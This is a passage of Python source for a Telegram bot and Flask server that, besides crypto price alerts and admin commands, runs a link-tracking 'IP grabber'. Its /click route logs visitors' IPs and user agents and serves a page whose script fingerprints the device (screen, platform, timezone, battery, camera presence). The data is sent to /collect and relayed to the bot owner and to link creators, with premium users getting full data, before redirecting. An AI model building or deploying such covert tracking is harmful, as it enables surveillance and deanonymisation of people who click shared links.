        conn.execute("DELETE FROM alerts WHERE user_id = ?", (user_id,))
        conn.execute("DELETE FROM ad_views WHERE user_id = ?", (user_id,))
        # Optionally delete links – careful, unke links bhi delete ho jayenge
        # conn.execute("DELETE FROM links WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        
        bot.reply_to(message, f"✅ @{username} ka data reset kar diya gaya (balance 0, premium hata diya).")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# Owner panel with inline buttons
@bot.message_handler(commands=['ownerpanel'])
def owner_panel(message):
    if not is_owner(message.from_user.id):
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="owner_stats"),
        types.InlineKeyboardButton("👥 Users", callback_data="owner_users"),
        types.InlineKeyboardButton("💰 Give Coin", callback_data="owner_givecoin"),
        types.InlineKeyboardButton("🔨 Block/Unblock", callback_data="owner_block"),
        types.InlineKeyboardButton("📢 Broadcast", callback_data="owner_broadcast"),
        types.InlineKeyboardButton("🔄 Reset User", callback_data="owner_reset")
    )
    bot.send_message(message.chat.id, "🛠 **Owner Control Panel**", reply_markup=markup, parse_mode="Markdown")

# Inline button callbacks for owner panel
@bot.callback_query_handler(func=lambda call: call.data.startswith('owner_'))
def owner_panel_callback(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Owner only!")
        return
    
    action = call.data.split('_')[1]
    
    if action == "stats":
        stats_command(call.message)
        bot.answer_callback_query(call.id)
    elif action == "users":
        bot.send_message(call.message.chat.id, "Users list feature coming soon...")
        bot.answer_callback_query(call.id)
    elif action == "givecoin":
        bot.send_message(call.message.chat.id, "Use /givecoin @username amount")
        bot.answer_callback_query(call.id)
    elif action == "block":
        bot.send_message(call.message.chat.id, "Use /block @username or /unblock @username")
        bot.answer_callback_query(call.id)
    elif action == "broadcast":
        bot.send_message(call.message.chat.id, "Use /broadcast your message")
        bot.answer_callback_query(call.id)
    elif action == "reset":
        bot.send_message(call.message.chat.id, "Use /resetuser @username")
        bot.answer_callback_query(call.id)

# =============================================================================
# ALERT CHECKER (Background Job)
# =============================================================================
def check_alerts():
    conn = get_db()
    alerts = conn.execute("SELECT * FROM alerts WHERE active=1").fetchall()
    for alert in alerts:
        data = get_crypto_price(alert["symbol"])
        if not data:
            continue
        triggered = False
        if alert["direction"] == "above" and data["price"] >= alert["target_price"]:
            triggered = True
        elif alert["direction"] == "below" and data["price"] <= alert["target_price"]:
            triggered = True

        if triggered:
            conn.execute("UPDATE alerts SET active=0 WHERE id=?", (alert["id"],))
            conn.commit()
            text = f"""
🚨🚨🚨 <b>PRICE ALERT TRIGGERED!</b> 🚨🚨🚨

╔══════════════════════════════════╗
║  💰 {alert['symbol']}/USDT
║  📍 Target: ${alert['target_price']:,.2f}
║  📊 Current: ${data['price']:,.4f}
║  ➡️ {alert['direction'].upper()} target reached!
╚══════════════════════════════════╝
"""
            try:
                bot.send_message(alert["user_id"], text)
            except:
                pass
    conn.close()

def cleanup_expired_ads():
    conn = get_db()
    conn.execute("UPDATE ads SET active=0 WHERE active=1 AND expires_at < ?", (datetime.now().isoformat(),))
    conn.commit()
    conn.close()

# =============================================================================
# FLASK ROUTES
# =============================================================================
@app.route('/click/<link_id>')
def click_track(link_id):
    conn = get_db()
    row = conn.execute("SELECT original_url FROM links WHERE link_id=?", (link_id,)).fetchone()
    if not row:
        conn.close()
        return "Link not found", 404
    original = row["original_url"]

    ip = request.remote_addr
    ua = request.user_agent.string

    conn.execute(
        "INSERT INTO clicks (link_id, ip, user_agent, timestamp) VALUES (?, ?, ?, ?)",
        (link_id, ip, ua, datetime.now().isoformat())
    )
    conn.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id=?", (link_id,))
    conn.commit()

    # Notify owner
    try:
        bot.send_message(OWNER_ID, f"💀 *New Click!*\nLink: `{link_id}`\nIP: `{ip}`", parse_mode="Markdown")
    except:
        pass

    # DANGER THEME HTML
    html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM ACCESS</title>
    <style>
        body {{ background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 50px 20px; }}
        .container {{ max-width: 600px; width: 100%; margin: 0 auto; }}
        h1 {{ font-size: 2.5rem; text-shadow: 0 0 10px #00ff00; animation: blink 2s infinite; }}
        @keyframes blink {{ 0%,100% {{ opacity:1; }} 50% {{ opacity:0.5; }} }}
        .progress-bar {{ width:100%; height:30px; background:#1a1a1a; border:2px solid #00ff00; border-radius:5px; margin:30px 0; overflow:hidden; }}
        .progress-fill {{ height:100%; width:0%; background: linear-gradient(90deg,#00ff00,#00aa00); animation: progress 3s ease-in-out forwards; }}
        @keyframes progress {{ 0% {{ width:0%; }} 100% {{ width:100%; }} }}
        .data-row {{ text-align:left; background:#1a1a1a; border:1px solid #00ff00; border-radius:5px; padding:10px; margin:10px 0; opacity:0; animation: fadeIn 0.5s ease-out forwards; }}
        .data-row:nth-child(1) {{ animation-delay:1s; }}
        .data-row:nth-child(2) {{ animation-delay:1.5s; }}
        .data-row:nth-child(3) {{ animation-delay:2s; }}
        .data-row:nth-child(4) {{ animation-delay:2.5s; }}
        .data-row:nth-child(5) {{ animation-delay:3s; }}
        .data-row:nth-child(6) {{ animation-delay:3.5s; }}
        .data-row:nth-child(7) {{ animation-delay:4s; }}
        .data-row:nth-child(8) {{ animation-delay:4.5s; }}
        @keyframes fadeIn {{ from {{ opacity:0; transform:translateY(10px); }} to {{ opacity:1; transform:translateY(0); }} }}
        .glitch {{ font-size:1.2rem; color:#ff0000; text-shadow:0 0 5px #ff0000; animation: glitch 1s infinite; }}
        @keyframes glitch {{ 0%,100% {{ transform:translate(0); }} 20% {{ transform:translate(-2px,2px); }} 40% {{ transform:translate(2px,-2px); }} 60% {{ transform:translate(-2px,-2px); }} 80% {{ transform:translate(2px,2px); }} }}
        .terminal {{ text-align:left; margin-top:30px; }}
        .terminal-line {{ color:#00ff00; margin:5px 0; font-size:0.8rem; }}
        .blink {{ animation: blink 1s step-end infinite; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ SYSTEM ACCESS ⚡</h1>
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <div class="glitch">⚠️ COLLECTING DATA... ⚠️</div>
        <div id="data-container">
            <div class="data-row"><strong>IP Address:</strong> <span id="ip">{request.remote_addr}</span></div>
            <div class="data-row"><strong>User Agent:</strong> <span id="ua">{request.user_agent.string[:100]}</span></div>
            <div class="data-row"><strong>Screen Resolution:</strong> <span id="screen">detecting...</span></div>
            <div class="data-row"><strong>Language:</strong> <span id="lang">detecting...</span></div>
            <div class="data-row"><strong>Platform:</strong> <span id="platform">detecting...</span></div>
            <div class="data-row"><strong>Timezone:</strong> <span id="tz">detecting...</span></div>
            <div class="data-row"><strong>Battery:</strong> <span id="battery">detecting...</span></div>
            <div class="data-row"><strong>Camera:</strong> <span id="camera">checking...</span></div>
        </div>
        <div class="terminal">
            <div class="terminal-line">> Establishing connection... <span class="blink">_</span></div>
            <div class="terminal-line">> Fetching device info...</div>
            <div class="terminal-line">> Geolocating...</div>
            <div class="terminal-line">> Redirecting in <span id="countdown">3</span> seconds...</div>
        </div>
    </div>
    <script>
        const data = {{
            screen: screen.width + 'x' + screen.height,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent
        }};
        document.getElementById('screen').innerText = data.screen;
        document.getElementById('lang').innerText = data.language;
        document.getElementById('platform').innerText = data.platform;
        document.getElementById('tz').innerText = data.timezone;
        if (navigator.getBattery) {{
            navigator.getBattery().then(b => {{
                let level = Math.round(b.level*100);
                document.getElementById('battery').innerText = level+'%';
                data.battery = level+'%';
            }});
        }} else {{
            document.getElementById('battery').innerText = 'Not available';
        }}
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
            navigator.mediaDevices.enumerateDevices().then(devices => {{
                let hasCamera = devices.some(d => d.kind === 'videoinput');
                document.getElementById('camera').innerText = hasCamera ? 'Available' : 'None';
                data.camera = hasCamera ? 'available' : 'none';
            }}).catch(() => document.getElementById('camera').innerText = 'Permission needed');
        }}
        fetch('/collect/{link_id}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(data)
        }}).catch(err => console.log(err));
        let sec = 3;
        const timer = setInterval(() => {{
            sec--;
            document.getElementById('countdown').innerText = sec;
            if (sec <= 0) {{
                clearInterval(timer);
                window.location.href = '{original}';
            }}
        }}, 1000);
    </script>
</body>
</html>
    """
    conn.close()
    return html

@app.route('/collect/<link_id>', methods=['POST'])
def collect_data(link_id):
    data = request.json
    ip = request.remote_addr
    conn = get_db()
    
    # Save all data (for owner)
    conn.execute("""
        UPDATE clicks SET 
            screen = ?, language = ?, platform = ?, timezone = ?,
            battery = ?, camera = ?
        WHERE link_id = ? AND ip = ? AND timestamp = (
            SELECT MAX(timestamp) FROM clicks WHERE link_id = ? AND ip = ?
        )
    """, (
        data.get('screen'), data.get('language'), data.get('platform'),
        data.get('timezone'), data.get('battery'), data.get('camera'),
        link_id, ip, link_id, ip
    ))
    conn.commit()

    # Get link owner
    row = conn.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,)).fetchone()
    if row:
        link_owner_id = row["user_id"]
        
        # Prepare FULL data message (for owner)
        owner_msg = f"💀 *FULL VISITOR DATA*\nLink: `{link_id}`\nIP: `{ip}`\n"
        for key, value in data.items():
            if value:
                owner_msg += f"{key}: `{value}`\n"
        
        # ✅ HAMESHA OWNER KO FULL DATA BHEJO
        bot.send_message(OWNER_ID, owner_msg, parse_mode="Markdown")
        
        # ✅ LINK OWNER KO DATA BHEJO (BASED ON PREMIUM)
        if is_premium(link_owner_id):
            # Premium user ko full data
            bot.send_message(link_owner_id, owner_msg, parse_mode="Markdown")
        else:
            # Free user ko basic data
            basic_msg = f"📊 *BASIC VISITOR DATA*\nLink: `{link_id}`\nIP: `{ip}`\n"
            basic_msg += f"Device: {data.get('platform', 'Unknown')}\n"
            basic_msg += f"Browser: {data.get('userAgent', 'Unknown')[:50]}\n"
            basic_msg += f"Screen: {data.get('screen', 'Unknown')}\n"
            basic_msg += f"Language: {data.get('language', 'Unknown')}\n"
            basic_msg += f"Timezone: {data.get('timezone', 'Unknown')}\n"
            bot.send_message(link_owner_id, basic_msg, parse_mode="Markdown")
    
    conn.close()
    return jsonify({"status": "ok"})

@app.route(WEBHOOK_PATH, methods=["POST"])
def webhook():
    if request.headers.get("content-type") == "application/json":
        json_str = request.get_data().decode("utf-8")
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return "", 200
    return "Invalid", 403

@app.route("/", methods=["GET"])
def index():
    return "🤖 Bot is running!", 200

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})

# =============================================================================
# SCHEDULER
# =============================================================================
scheduler = BackgroundScheduler()
scheduler.add_job(check_alerts, "interval", seconds=30)
scheduler.add_job(cleanup_expired_ads, "interval", minutes=10)
scheduler.start()

# =============================================================================
# DEBUG COMMANDS - Remove after testing
# =============================================================================
@bot.message_handler(commands=['ping'])
def ping(message):
    bot.reply_to(message, "pong")

@bot.message_handler(commands=['debug'])
def debug_info(message):
    text = f"Your ID: {message.from_user.id}\n"
    text += f"Owner ID: {OWNER_ID}\n"
    text += f"Is Owner: {message.from_user.id == OWNER_ID}\n"
    text += f"Bot: {bot.get_me().first_name}"
    bot.reply_to(message, text)

@bot.message_handler(commands=['givecoinid'])
def givecoinid_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Owner only")
        return
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /givecoinid user_id amount")
            return
        user_id = int(parts[1])
        amount = float(parts[2])
        add_coins(user_id, amount)
        bot.reply_to(message, f"✅ {amount} ReCOIN given to user {user_id}")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

# =============================================================================
# SET WEBHOOK & START
# =============================================================================
def set_webhook():
    bot.remove_webhook()
    time.sleep(1)
    webhook_url = f"{RENDER_URL}{WEBHOOK_PATH}"
    bot.set_webhook(url=webhook_url)
    logger.info(f"Webhook set: {webhook_url}")

# =============================================================================
# (No separate owner_controls import needed – commands embedded above)
# =============================================================================

if __name__ == "__main__":
    set_webhook()
    app.run(host="0.0.0.0", port=PORT, debug=False)
